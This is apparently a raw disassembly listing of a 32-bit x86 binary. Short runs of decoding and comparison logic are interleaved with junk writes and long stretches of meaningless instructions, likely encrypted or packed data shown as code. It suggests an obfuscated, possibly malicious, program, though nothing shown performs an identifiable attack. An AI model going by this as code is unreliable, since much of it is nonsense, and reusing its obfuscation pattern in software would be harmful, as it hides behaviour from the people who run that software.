  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	dec    DWORD PTR [ebp+0x21c919ee]
  4049c1:	jo     0x404a33
  4049c3:	cmp    eax,0xa570707d
  4049c8:	add    ebp,DWORD PTR [ecx-0x75]
  4049cb:	xchg   edx,eax
  4049cc:	mov    edx,0x260574c8
  4049d1:	jle    0x404986
  4049d3:	pop    edx
  4049d4:	nop
  4049d5:	dec    esi
  4049d6:	in     al,dx
  4049d7:	retf   
  4049d8:	jno    0x40495e
  4049da:	shl    BYTE PTR [ebp+ebx*1-0x3d7fe3b8],cl
  4049e1:	(bad)  
  4049e3:	sub    al,0x36
  4049e5:	ret    0xf1c9
  4049e8:	ret    0x88cb
  4049eb:	cld    
  4049ec:	stos   DWORD PTR es:[edi],eax
  4049ed:	jg     0x404a49
  4049ef:	sbb    eax,DWORD PTR [esi+0x117b8624]
  4049f5:	push   0xace26ad0
  4049fa:	pop    ss
  4049fb:	popa   
  4049fc:	int3   
  4049fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049fe:	jae    0x4049a6
  404a00:	in     eax,0x8e
  404a02:	psllq  mm4,QWORD PTR [edx]
  404a05:	lahf   
  404a06:	test   eax,0xcf278e73
  404a0b:	es int3 
  404a0d:	and    DWORD PTR [ecx],ebp
  404a0f:	test   eax,0x52f8fd9d
  404a14:	push   ebp
  404a15:	jle    0x404a4e
  404a17:	gs aad 0xf1
  404a1a:	dec    ecx
  404a1b:	adc    DWORD PTR [esi+0x2b5f80ac],0x5cfe6faa
  404a25:	repz xchg esp,eax
  404a27:	push   ss
  404a28:	call   0xf7485a29
  404a2d:	mov    dl,0x90
  404a2f:	push   ds
  404a30:	mov    bl,dl
  404a32:	cdq    
  404a33:	inc    edi
  404a34:	mov    ebx,0xf569faa7
  404a39:	int    0x66
  404a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a3c:	aaa    
  404a3d:	add    DWORD PTR [ecx-0x66],edi
  404a40:	addr16 out dx,eax
  404a42:	mov    BYTE PTR [ebp-0x717b3761],dl
  404a48:	mov    BYTE PTR [edx],ah
  404a4a:	xor    BYTE PTR [ebx-0x67],ch
  404a4d:	mov    al,ds:0xdc8be446
  404a52:	or     al,0x47
  404a54:	fldl2t 
  404a56:	(bad)  ds:0xde69dde9
  404a5c:	leave  
  404a5d:	bound  ebx,QWORD PTR [edi-0x4ab94e32]
  404a63:	call   0x910f0443
  404a68:	xchg   ebp,eax
  404a69:	mov    eax,0xe3f4d9c9
  404a6e:	js     0x404ae5
  404a70:	xlat   BYTE PTR ds:[ebx]
  404a71:	outs   dx,BYTE PTR ds:[esi]
  404a72:	test   BYTE PTR [eax+0x26],0xb5
  404a76:	cli    
  404a77:	xor    esp,DWORD PTR [edx-0x28]
  404a7a:	mov    dl,BYTE PTR [edi+0x612d1283]
  404a80:	std    
  404a81:	inc    ebp
  404a82:	pusha  
  404a83:	and    ebx,DWORD PTR [eax-0x71b78894]
  404a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a8a:	push   ss
  404a8b:	stc    
  404a8c:	jbe    0x404a82
  404a8e:	nop
  404a8f:	(bad)  
  404a90:	iret   
  404a91:	into   
  404a92:	clc    
  404a93:	ins    BYTE PTR es:[edi],dx
  404a94:	loopne 0x404a59
  404a96:	pop    ebp
  404a97:	bound  esi,QWORD PTR [edx+0x6c89a67]
  404a9d:	mov    edx,0xa551708b
  404aa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aa3:	sbb    DWORD PTR [edx+0x4aa9479b],edx
  404aa9:	xor    al,0x13
  404aab:	cmp    bl,bh
  404aad:	push   es
  404aae:	mov    ah,0x57
  404ab0:	or     eax,0x8c9f30d3
  404ab5:	ins    BYTE PTR es:[edi],dx
  404ab6:	dec    ebp
  404ab7:	add    al,0x73
  404ab9:	cmp    DWORD PTR [esi-0x40],esi
  404abc:	in     eax,0x84
  404abe:	fnstcw WORD PTR [esi]
  404ac0:	loop   0x404a79
  404ac2:	lock xchg ebp,eax
  404ac4:	pop    ebp
  404ac5:	and    eax,DWORD PTR [eax+edx*2-0x4139f140]
  404acc:	mov    al,0x20
  404ace:	sbb    esp,DWORD PTR [eax+0x1e]
  404ad1:	prefetchwt1 BYTE PTR [edx-0x28]
  404ad5:	aam    0x9a
  404ad7:	fsub   st(3),st
  404ad9:	sti    
  404ada:	retf   0x3ddf
  404add:	xor    eax,0xd9dfb1f6
  404ae2:	fiadd  WORD PTR [edx]
  404ae4:	sub    eax,0xb245e23b
  404ae9:	prefetcht0 BYTE PTR [esp+ecx*1+0x58]
  404aee:	inc    ebx
  404aef:	add    eax,0x10dcb82e
  404af4:	mov    ch,0x79
  404af6:	ret    0xb629
  404af9:	cmp    DWORD PTR [ebp+edx*1+0x28],ecx
  404afd:	sub    DWORD PTR [ebp+0x67],ebx
  404b00:	cmp    eax,0xa55db437
  404b05:	aas    
  404b06:	loopne 0x404b0b
  404b08:	leave  
  404b09:	ins    BYTE PTR es:[edi],dx
  404b0a:	lea    edi,[edi-0x40]
  404b0d:	lock fs inc esi
  404b10:	loope  0x404b09
  404b12:	cs aas 
  404b14:	sbb    cl,ch
  404b16:	sub    DWORD PTR [edx],0x3c
  404b19:	outs   dx,DWORD PTR ds:[esi]
  404b1a:	push   ss
  404b1b:	xchg   BYTE PTR [esi-0x2bbf78eb],al
  404b21:	(bad)  
  404b22:	push   ebx
  404b23:	(bad)  
  404b24:	sti    
  404b25:	clc    
  404b26:	rsqrtps xmm2,XMMWORD PTR [ecx+edi*1]
  404b2a:	call   FWORD PTR [ecx+0x6a]
  404b2d:	or     DWORD PTR [esi],edx
  404b2f:	pop    ebx
  404b30:	push   0x2e
  404b32:	inc    ebp
  404b33:	mov    edi,0xccb5f274
  404b38:	stc    
  404b39:	push   es
  404b3a:	sti    
  404b3b:	pop    ebx
  404b3c:	(bad)  
  404b3d:	aas    
  404b3e:	popf   
  404b3f:	out    dx,eax
  404b40:	inc    ebp
  404b41:	fadd   st,st(3)
  404b43:	add    bl,BYTE PTR [edx-0x13ff5145]
  404b49:	ss add eax,0x2bc912a3
  404b50:	in     al,dx
  404b51:	push   ds
  404b52:	imul   DWORD PTR [eax]
  404b54:	repnz mov esp,0x8e62a198
  404b5a:	jmp    0x506b:0x94ee8a9c
  404b61:	xchg   edi,eax
  404b62:	mov    ebp,0x505d339f
  404b67:	test   BYTE PTR [edx-0x74f7fcd9],cl
  404b6d:	pop    ss
  404b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b6f:	or     eax,0x56ce08a3
  404b74:	std    
  404b75:	and    esp,ebx
  404b77:	shl    DWORD PTR [ebx+0x1e64700b],1
  404b7d:	aaa    
  404b7e:	retf   0x25e8
  404b81:	cdq    
  404b82:	ret    0xbeb
  404b85:	pop    ebp
  404b86:	jb     0x404b38
  404b88:	test   BYTE PTR [eax-0x3d],dl
  404b8b:	push   ds
  404b8c:	outs   dx,DWORD PTR ds:[esi]
  404b8d:	cwde   
  404b8e:	inc    ebx
  404b8f:	mov    dh,BYTE PTR [edx+0x16ca4f19]
  404b95:	sbb    BYTE PTR [eax],ch
  404b97:	idiv   ecx
  404b99:	cmp    edx,edi
  404b9b:	add    BYTE PTR [bp+si-0x5258],al
  404ba0:	out    dx,eax
  404ba1:	pushf  
  404ba2:	xlat   BYTE PTR ds:[ebx]
  404ba3:	jo     0x404c06
  404ba5:	and    DWORD PTR ds:0x13026c3d,edi
  404bab:	mov    esi,0x24ec0d36
  404bb0:	add    DWORD PTR [edx],edi
  404bb2:	cmp    esi,edx
  404bb4:	aam    0x9
  404bb6:	mov    bh,0xd9
  404bb8:	(bad)  
  404bb9:	iret   
  404bba:	mov    ds:0x4a35a08b,al
  404bbf:	adc    al,0x3c
  404bc1:	es push edi
  404bc3:	jmp    0x404c22
  404bc5:	adc    edi,eax
  404bc7:	mov    esi,0x431e3b52
  404bcc:	ret    
  404bcd:	sahf   
  404bce:	mov    esi,0x2ea29f98
  404bd3:	test   eax,0xd4f6fb4b
  404bd8:	mov    esp,0xedcfb084
  404bdd:	xor    eax,0x2602553
  404be2:	inc    esp
  404be3:	jp     0x404c23
  404be5:	in     al,0xef
  404be7:	(bad)  
  404be8:	and    eax,0xa6ed992e
  404bed:	ds xchg ebp,edi
  404bf0:	sbb    eax,0x226b546e
  404bf5:	push   ds
  404bf6:	cmc    
  404bf7:	mov    WORD PTR [ebp-0x18c8861b],ss
  404bfd:	or     al,0x8d
  404bff:	aas    
  404c00:	sbb    ecx,eax
  404c02:	cld    
  404c03:	xlat   BYTE PTR ds:[ebx]
  404c04:	sbb    BYTE PTR [esi+0x73],al
  404c07:	mov    gs,WORD PTR [eax-0x2f]
  404c0a:	sbb    eax,0xff7e9524
  404c0f:	mov    dh,0xb0
  404c11:	retf   
  404c12:	shl    BYTE PTR [ebp+0x8],0xae
  404c16:	sbb    al,0x6
  404c18:	dec    esi
  404c19:	mov    ebx,0xd0f89aa4
  404c1e:	add    ecx,ebp
  404c20:	mov    ds,WORD PTR [eax+0x511ee302]
  404c26:	jg     0x404bcd
  404c28:	rcl    ebp,1
  404c2a:	pop    eax
  404c2b:	fdivp  st(2),st
  404c2d:	mov    edx,0xf6ca50b8
  404c32:	mov    eax,0xf2046f93
  404c37:	ret    0xf196
  404c3a:	cwde   
  404c3b:	call   0x322e:0x3fad4202
  404c42:	es xchg ecx,eax
  404c44:	jg     0x404c97
  404c46:	mov    bl,BYTE PTR [edi+0x5e]
  404c49:	inc    esp
  404c4a:	mov    ch,0xdd
  404c4c:	pop    ecx
  404c4d:	rol    DWORD PTR [edx-0x1887f5d],cl
  404c53:	inc    edi
  404c54:	inc    cx
  404c56:	dec    eax
  404c57:	push   esp
  404c58:	int    0x3c
  404c5a:	xor    bh,BYTE PTR ds:0xf68229c3
  404c60:	out    dx,al
  404c61:	inc    ecx
  404c62:	into   
  404c63:	cmp    BYTE PTR ds:0x74aac6c6,ah
  404c69:	enter  0x5865,0x59
  404c6d:	adc    BYTE PTR [edx],dh
  404c6f:	lea    edx,[edx+0x53]
  404c72:	cmc    
  404c73:	arpl   WORD PTR [edx+edi*2],si
  404c76:	jbe    0x404c50
  404c78:	mov    ds:0xf946786f,al
  404c7d:	jmp    0x9c2b:0xa5409e01
  404c84:	cmp    DWORD PTR [ecx+0x10],eax
  404c87:	mov    edi,0xaf29e600
  404c8c:	outs   dx,DWORD PTR ds:[esi]
  404c8d:	sbb    DWORD PTR [esi-0x2143dd3e],eax
  404c93:	cld    
  404c94:	dec    eax
  404c95:	xchg   esp,eax
  404c96:	inc    ebp
  404c97:	cld    
  404c98:	out    dx,eax
  404c99:	ret    
  404c9a:	or     BYTE PTR [ebp+eax*4-0x5065b018],cl
  404ca1:	sub    DWORD PTR [ebx],ecx
  404ca3:	xchg   ebx,eax
  404ca4:	pop    ecx
  404ca5:	leave  
  404ca6:	mov    cl,0x5
  404ca8:	mov    al,0xf4
  404caa:	stos   DWORD PTR es:[edi],eax
  404cab:	js     0x404cea
  404cad:	mov    ebp,0xcc79a0c6
  404cb2:	outs   dx,BYTE PTR ds:[esi]
  404cb3:	jne    0x404d07
  404cb5:	dec    edx
  404cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cb7:	stc    
  404cb8:	imul   ebp,DWORD PTR [ebp+0x16dfe72d],0xffffffb2
  404cbf:	out    0x3e,eax
  404cc1:	mov    bl,0x25
  404cc3:	not    DWORD PTR fs:[eax+0x11ea641b]
  404cca:	arpl   WORD PTR [esi-0x30],bx
  404ccd:	rol    BYTE PTR [ebx],cl
  404ccf:	add    eax,0x43c2aaba
  404cd4:	mov    eax,ds:0x25568066
  404cd9:	xor    ebx,0xfacdfa5a
  404cdf:	adc    ebp,DWORD PTR [eax+0x76]
  404ce2:	pop    ebx
  404ce3:	and    al,BYTE PTR [ecx]
  404ce5:	xchg   esp,eax
  404ce6:	test   DWORD PTR [eax-0x48],edx
  404ce9:	enter  0x213a,0x67
  404ced:	test   BYTE PTR [esi],0x5d
  404cf0:	icebp  
  404cf1:	inc    ebx
  404cf2:	fsub   QWORD PTR [esi+0x45]
  404cf5:	popf   
  404cf6:	jae    0x404ce6
  404cf8:	outs   dx,BYTE PTR ds:[esi]
  404cf9:	jnp    0x404d62
  404cfb:	fnstenv [ebx+0x7e]
  404cfe:	adc    BYTE PTR [ecx+0x77],bh
  404d01:	cmp    DWORD PTR [eax-0x132f328c],ebx
  404d07:	push   ebp
  404d08:	mov    dh,0x42
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e6ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax-0x5a]
  404d39:	and    eax,0x2e9651c7
  404d3e:	jo     0x404db0
  404d40:	cmp    eax,0x3f70707d
  404d45:	aas    
  404d46:	or     edx,DWORD PTR [ebx+0x2d0a9f25]
  404d4c:	lds    edi,FWORD PTR [edx+0x75]
  404d4f:	jne    0x404ce2
  404d51:	fistp  DWORD PTR [ecx]
  404d53:	mov    ebx,0x333d62ec
  404d58:	ins    BYTE PTR es:[edi],dx
  404d59:	add    eax,0x5abbadac
  404d5e:	mov    esp,0x546c028
  404d63:	fst    QWORD PTR [edi-0x51]
  404d66:	ss dec ebp
  404d68:	sub    DWORD PTR [eax+0xeca7e81],ebx
  404d6e:	stc    
  404d6f:	jns    0x404d72
  404d71:	mov    BYTE PTR [ebp+0x72],ch
  404d74:	or     al,0xbd
  404d76:	mov    al,0x14
  404d78:	sub    DWORD PTR [edx],eax
  404d7a:	fiadd  DWORD PTR [esi-0x36]
  404d7d:	pop    ebp
  404d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7f:	dec    ebx
  404d80:	fnstcw WORD PTR [ebx]
  404d82:	push   0x37
  404d84:	mov    ds:0xb5382376,eax
  404d89:	fcomip st,st(2)
  404d8b:	data16 jns 0x404de6
  404d8e:	push   ebx
  404d8f:	inc    eax
  404d90:	push   edx
  404d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d92:	addr16 pop eax
  404d94:	cmp    ecx,DWORD PTR [esp+ebp*2-0x5223b69e]
  404d9b:	ins    BYTE PTR es:[edi],dx
  404d9c:	push   ss
  404d9d:	push   eax
  404d9e:	inc    ecx
  404d9f:	xchg   esi,eax
  404da0:	pop    ebx
  404da1:	mov    bh,0x4d
  404da3:	popf   
  404da4:	mov    eax,ds:0x4fd75af9
  404da9:	and    ecx,DWORD PTR [edi-0x1b]
  404dac:	in     al,dx
  404dad:	push   es
  404dae:	loopne 0x404df8
  404db0:	ins    DWORD PTR es:[edi],dx
  404db1:	out    0x63,al
  404db3:	or     eax,0x77808c68
  404db8:	loopne 0x404d64
  404dba:	cmp    al,0xa0
  404dbc:	call   0x7617:0xf241378
  404dc3:	pop    ebx
  404dc5:	xchg   ecx,eax
  404dc6:	push   0xffffffb9
  404dc8:	jp     0x404d77
  404dca:	stos   BYTE PTR es:[edi],al
  404dcb:	fadd   QWORD PTR [edi]
  404dcd:	icebp  
  404dce:	sbb    BYTE PTR [ecx],bl
  404dd0:	jbe    0x404d6d
  404dd2:	(bad)  
  404dd3:	out    0xa0,al
  404dd5:	jae    0x404e50
  404dd7:	add    BYTE PTR [esi-0x19153e31],ah
  404ddd:	mov    al,0xac
  404ddf:	sbb    BYTE PTR [edi-0x5179f3a7],al
  404de5:	or     bl,BYTE PTR [edx+ebx*2+0x1d235e8a]
  404dec:	(bad)  
  404dee:	mov    DWORD PTR [ebp-0x436438e8],edi
  404df4:	nop
  404df5:	add    ebp,DWORD PTR [ebx+0x4c]
  404df8:	xchg   ebp,eax
  404df9:	stos   DWORD PTR es:[edi],eax
  404dfa:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dfc:	mov    edx,0x1a4cebf2
  404e01:	into   
  404e02:	mov    dh,0xf5
  404e04:	out    dx,al
  404e05:	sub    al,0x27
  404e07:	and    eax,0x8a0f00c3
  404e0c:	adc    BYTE PTR [edx-0x65],bl
  404e0f:	sub    edx,DWORD PTR [ebx+0x4566b1d8]
  404e15:	and    ebp,ecx
  404e17:	cmp    al,0x37
  404e19:	neg    DWORD PTR ds:0x6b39dd15
  404e1f:	out    dx,eax
  404e20:	sbb    BYTE PTR [eax],al
  404e22:	and    BYTE PTR [ebx-0x17a4cf1a],0xde
  404e29:	iret   
  404e2a:	sub    ecx,DWORD PTR [ecx-0x649a7460]
  404e30:	scas   eax,DWORD PTR es:[edi]
  404e31:	or     DWORD PTR [edi+0xd],0x390a1a1
  404e38:	add    cl,dl
  404e3a:	sbb    BYTE PTR [edi-0x49c717c2],0xe1
  404e41:	shl    DWORD PTR [edx-0x1cc6d9b5],0x5c
  404e48:	aam    0xb8
  404e4a:	push   ebp
  404e4b:	mov    ds:0x60f85fff,al
  404e50:	sub    BYTE PTR [eax-0x63],ch
  404e53:	mov    dh,0x34
  404e55:	jecxz  0x404e61
  404e57:	sub    edi,eax
  404e59:	mov    BYTE PTR [edx-0x40],cl
  404e5c:	(bad)  
  404e5d:	(bad)  
  404e5e:	sbb    dl,BYTE PTR ss:[edx+0x45]
  404e62:	xor    DWORD PTR [edi],ecx
  404e64:	or     BYTE PTR [ebp-0x3a],cl
  404e67:	nop
  404e68:	jne    0x404e7f
  404e6a:	pop    ecx
  404e6b:	fwait
  404e6c:	idiv   ecx
  404e6e:	mov    al,0xd
  404e70:	mov    BYTE PTR [eax+eiz*2-0x4d],0xcc
  404e75:	add    DWORD PTR [ecx-0x6c948842],0x4493a553
  404e7f:	cmp    esi,DWORD PTR [esi]
  404e81:	mov    ah,0xb7
  404e83:	inc    ebp
  404e84:	mov    ds:0x930b2586,al
  404e89:	xor    al,0x63
  404e8b:	ins    BYTE PTR es:[edi],dx
  404e8c:	(bad)  
  404e8d:	outs   dx,DWORD PTR ds:[esi]
  404e8e:	push   esi
  404e8f:	lock xor BYTE PTR [ebx-0x4f164ea9],dh
  404e96:	add    al,0xaa
  404e98:	mov    ds:0xda855ddb,al
  404e9d:	push   esi
  404e9e:	dec    ecx
  404e9f:	hlt    
  404ea0:	fistp  DWORD PTR [edi]
  404ea2:	xchg   ebx,eax
  404ea3:	std    
  404ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ea5:	shr    BYTE PTR [ebp-0x2b],cl
  404ea8:	jo     0x404e2d
  404eaa:	xor    al,0xaf
  404eac:	push   es
  404ead:	jge    0x404e3a
  404eaf:	sub    eax,DWORD PTR [edi-0x74]
  404eb2:	neg    BYTE PTR [ecx]
  404eb4:	jmp    0x404ee0
  404eb6:	jne    0x404e8e
  404eb8:	jns    0x404e67
  404eba:	mov    al,ds:0x6ad9d6b5
  404ebf:	jg     0x404ee8
  404ec1:	add    DWORD PTR [ebx],ebx
  404ec3:	scas   eax,DWORD PTR es:[edi]
  404ec4:	jge    0x404f1a
  404ec6:	fs jg  0x404e66
  404ec9:	cmp    bh,BYTE PTR ds:0xdbbc2dfa
  404ecf:	pusha  
  404ed0:	mov    eax,0xa29d6716
  404ed5:	or     BYTE PTR [ebp-0x36],ah
  404ed8:	add    al,0x81
  404eda:	(bad)  
  404edb:	jecxz  0x404e7c
  404edd:	das    
  404ede:	sti    
  404edf:	icebp  
  404ee0:	and    ebp,DWORD PTR [edx]
  404ee2:	fwait
  404ee3:	repz xchg ecx,eax
  404ee5:	out    0xe3,eax
  404ee7:	push   esp
  404ee8:	xchg   esi,eax
  404ee9:	and    al,0x97
  404eeb:	jmp    0xad56efe9
  404ef0:	icebp  
  404ef1:	retf   
  404ef2:	mov    esi,0x20f0189
  404ef7:	xchg   DWORD PTR [ebx],ebp
  404ef9:	dec    edx
  404efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404efb:	into   
  404efc:	and    eax,0xb6d87cf2
  404f01:	aaa    
  404f02:	scas   eax,DWORD PTR es:[edi]
  404f03:	sti    
  404f04:	dec    ebx
  404f05:	(bad)  
  404f06:	loope  0x404f48
  404f08:	pop    ebx
  404f09:	imul   edi,ecx,0x18cf0eb
  404f0f:	mov    bl,0x3e
  404f11:	gs int3 
  404f13:	stos   BYTE PTR es:[edi],al
  404f14:	add    bl,ch
  404f16:	adc    eax,0x49efaaa9
  404f1b:	or     eax,edi
  404f1d:	inc    BYTE PTR [edx+0x7dae3a4]
  404f23:	push   esp
  404f24:	ins    BYTE PTR es:[edi],dx
  404f25:	xor    cl,BYTE PTR [ecx-0x4e]
  404f28:	repnz mov bl,0x91
  404f2b:	into   
  404f2c:	mov    ch,0xe3
  404f2e:	push   es
  404f2f:	sub    DWORD PTR [ecx+0x2b],edi
  404f32:	sub    BYTE PTR [esi-0x34],ah
  404f35:	out    0x6a,eax
  404f37:	jbe    0x404f54
  404f39:	and    bh,ah
  404f3b:	jl     0x404fb8
  404f3d:	and    al,BYTE PTR [edi]
  404f3f:	xchg   ecx,eax
  404f40:	lahf   
  404f41:	jnp    0x404f66
  404f43:	int    0x2
  404f45:	mov    WORD PTR [esi],?
  404f47:	test   BYTE PTR [esi-0x31d15ffb],bl
  404f4d:	push   cs
  404f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f4f:	in     eax,dx
  404f50:	test   BYTE PTR [eax+ebp*2-0x14d0df74],dh
  404f57:	and    DWORD PTR [esi-0x1b],ebp
  404f5a:	retf   
  404f5b:	add    BYTE PTR [ebx+0xf94517c],0xd7
  404f62:	jmp    0xbe6:0x15bee664
  404f69:	inc    ebx
  404f6a:	sub    DWORD PTR [edx-0x34],0xa96ea73f
  404f71:	scas   al,BYTE PTR es:[edi]
  404f72:	and    ch,BYTE PTR [eax]
  404f74:	test   BYTE PTR [eax+esi*1+0x1d],cl
  404f78:	mov    ebx,cs
  404f7a:	or     eax,DWORD PTR [esi+0xfe64a08]
  404f80:	cmp    DWORD PTR ds:0x9a47da13,esi
  404f86:	fsubr  QWORD PTR [esi+ebx*4]
  404f89:	in     al,0xd0
  404f8b:	fidiv  DWORD PTR [ecx]
  404f8d:	xchg   edi,eax
  404f8e:	xchg   esp,eax
  404f8f:	cmc    
  404f90:	shr    dl,1
  404f92:	adc    al,0x3e
  404f94:	push   es
  404f95:	cmp    al,0x8f
  404f97:	test   eax,0xfac90d7c
  404f9c:	stos   DWORD PTR es:[edi],eax
  404f9d:	mov    WORD PTR [esi+0x31740689],ds
  404fa3:	cdq    
  404fa4:	loop   0x404ff1
  404fa6:	stos   DWORD PTR es:[edi],eax
  404fa7:	sar    DWORD PTR [eax-0x36c1ebed],cl
  404fad:	pop    edx
  404fae:	jne    0x404ffd
  404fb0:	les    esi,FWORD PTR [esi-0x1b289b39]
  404fb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fb7:	test   eax,0x6bfca39f
  404fbc:	clc    
  404fbd:	in     eax,0xd7
  404fbf:	scas   al,BYTE PTR es:[edi]
  404fc0:	mov    ah,0xa9
  404fc2:	push   es
  404fc3:	in     eax,0x13
  404fc5:	pop    edi
  404fc6:	in     eax,0x16
  404fc8:	fild   QWORD PTR [eax+ebx*8-0x8a1f57c]
  404fcf:	push   ebp
  404fd0:	inc    edi
  404fd1:	test   eax,0xff5e0b68
  404fd6:	jmp    FWORD PTR [ecx+0x73e47c01]
  404fdc:	(bad)  
  404fdd:	xchg   ebx,eax
  404fde:	ja     0x404fc5
  404fe0:	xchg   ebp,eax
  404fe1:	add    BYTE PTR [esi-0x435e2b54],bl
  404fe7:	adc    al,0x36
  404fea:	ror    DWORD PTR [ecx],cl
  404fec:	adc    al,0xbc
  404fee:	mov    cs,WORD PTR [edi-0x70f5f038]
  404ff4:	xlat   BYTE PTR ds:[ebx]
  404ff5:	dec    edx
  404ff6:	push   esp
  404ff7:	ret    0x8acc
  404ffa:	pop    esi
  404ffb:	fisub  WORD PTR [ecx]
  404ffd:	mov    BYTE PTR [ebp+0x50445da5],al
  405003:	loopne 0x404fcf
  405005:	mov    DWORD PTR [eax-0x7f093a63],ebp
  40500b:	out    0x90,eax
  40500d:	xor    al,0x5a
  40500f:	ss ss add edi,ebx
  405013:	mov    BYTE PTR [ecx-0x79f72c07],0x7e
  40501a:	dec    al
  40501c:	lods   al,BYTE PTR ds:[esi]
  40501d:	xchg   edx,eax
  40501e:	xchg   esi,eax
  40501f:	mov    ebp,0x408ef29a
  405024:	jbe    0x405096
  405026:	idiv   BYTE PTR [ecx+0x6a]
  405029:	dec    ecx
  40502a:	test   DWORD PTR [edi-0x2c],edi
  40502d:	cmp    esi,DWORD PTR [ebp-0x12]
  405030:	inc    eax
  405031:	push   esi
  405032:	sbb    BYTE PTR gs:0x8930a5c2,cl
  405039:	out    0x6d,eax
  40503b:	call   FWORD PTR [ebx-0x6880a415]
  405041:	popa   
  405042:	mov    ch,ah
  405044:	rol    edx,1
  405046:	cmp    DWORD PTR [edx+0x4c],0x63
  40504a:	in     al,dx
  40504b:	into   
  40504c:	xor    DWORD PTR [eax+0x2d16d049],edi
  405052:	call   0xf23fcc23
  405057:	or     DWORD PTR [ecx],esp
  405059:	inc    ebp
  40505a:	leave  
  40505b:	dec    esi
  40505c:	jne    0x404ffd
  40505e:	and    DWORD PTR [ebp+0x23],ebp
  405061:	sbb    edx,ebx
  405063:	mov    es,edx
  405065:	xor    ebp,DWORD PTR [ebx]
  405067:	(bad)  
  405069:	sub    esi,DWORD PTR [esi]
  40506b:	xchg   BYTE PTR ds:0x1103b302,cl
  405071:	inc    ecx
  405072:	push   0x74
  405074:	outs   dx,DWORD PTR ds:[esi]
  405075:	dec    esp
  405076:	dec    ecx
  405077:	adc    DWORD PTR [ebx-0x4d],ecx
  40507a:	sar    DWORD PTR ds:0x5520c863,1
  405080:	pop    eax
  405081:	adc    DWORD PTR [ebx+0x526629df],ebx
  405087:	mov    eax,DWORD PTR [ebp-0xc]
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shr    edi,0x99
  405133:	fisubr WORD PTR [ebx]
  405135:	push   ebx
  405136:	sub    esi,DWORD PTR [eax+0x70]
  405139:	cmp    eax,0x8870707d
  40513e:	pop    esp
  40513f:	pushf  
